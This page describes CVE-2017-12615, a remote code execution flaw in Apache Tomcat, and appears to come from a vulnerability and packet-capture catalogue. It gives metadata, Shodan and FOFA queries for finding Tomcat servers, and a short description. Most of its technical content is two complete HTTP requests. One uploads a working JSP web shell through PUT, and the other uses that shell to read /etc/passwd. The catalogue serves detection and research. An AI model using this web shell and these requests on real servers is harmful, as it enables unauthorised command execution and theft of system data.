---
layout: post
cve_id: CVE-2017-12615
title: Apache Tomcat Servers - Remote Code Execution
pcap: true
pcap_path: /pcaps/2017/CVE-2017-12615.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2017/CVE-2017-12615.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pikpikcu
severity: high
impact: 'Successful exploitation of this vulnerability allows an attacker to execute
  arbitrary code on the affected server.

  '
remediation: 'Apply the latest security patches or upgrade to a non-vulnerable version
  of Apache Tomcat.

  '
reference:
- https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615
- https://lists.apache.org/thread.html/8fcb1e2d5895413abcf266f011b9918ae03e0b7daceb118ffbf23f8c@%3Cannounce.tomcat.apache.org%3E
- http://web.archive.org/web/20211206035549/https://securitytracker.com/id/1039392
- https://nvd.nist.gov/vuln/detail/CVE-2017-12615
- http://breaktoprotect.blogspot.com/2017/09/the-case-of-cve-2017-12615-tomcat-7-put.html
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 8.1
  cve-id: CVE-2017-12615
  cwe-id: CWE-434
  epss-score: 0.94277
  epss-percentile: 0.99932
  cpe: cpe:2.3:a:apache:tomcat:7.0:*:*:*:*:*:*:*
metadata:
  max-request: 2
  vendor: apache
  product: tomcat
  shodan-query:
  - title:"Apache Tomcat"
  - http.title:"apache tomcat"
  - http.html:"apache tomcat"
  - cpe:"cpe:2.3:a:apache:tomcat"
  fofa-query:
  - body="apache tomcat"
  - title="apache tomcat"
  google-query: intitle:"apache tomcat"
tags:
- cve2017
- cve
- rce
- tomcat
- kev
- vulhub
- apache
- fileupload
- intrusive
- vkev
- vuln
---

## üîç Vulnerability Description
Apache Tomcat servers 7.0.{0 to 79} are susceptible to remote code execution. By design, you are not allowed to upload JSP files via the PUT method. This is likely a security measure to prevent an attacker from uploading a JSP shell and gaining remote code execution on the server. However, due to the insufficient checks, an attacker could gain remote code execution on Apache Tomcat servers that have enabled PUT method by using a specially crafted HTTP request.


## üåê HTTP Request
```nohighlight
PUT /poc.jsp/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:109.0) Gecko/20100101 Firefox/115.0
Connection: close
Content-Length: 575
Accept: */*
Accept-Language: en
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
out.println("Command: " + request.getParameter("cmd") + "<BR>");
Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) {
out.println(disr);
disr = dis.readLine();
}
}
%>
```

```nohighlight
GET /poc.jsp?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

